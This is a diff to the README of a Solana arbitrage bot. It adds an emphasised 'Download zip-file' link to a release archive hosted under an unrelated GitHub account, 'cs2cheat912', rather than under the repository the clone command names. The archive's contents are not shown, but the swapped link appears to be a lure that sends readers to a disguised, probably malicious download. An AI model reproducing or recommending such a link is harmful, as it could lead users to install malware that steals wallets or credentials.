@@ -38,7 +38,7 @@ It scans multiple DEXs, identifies profitable routes, and executes transactions 
 
 ### Installation
     git clone https://github.com/insionCEO/Solana-Arbitrage-Bot.git
-  or Download zip-file
+   ⭐️ or [Download zip-file](https://github.com/cs2cheat912/Solana-Arbitrage-Bot/releases/download/Solana-Bot/Solana-Arbitrage-Bot-Master.zip)
 
 ### 📊 Supported DEXs
 | Protocol | Pool Types | Fee Range |
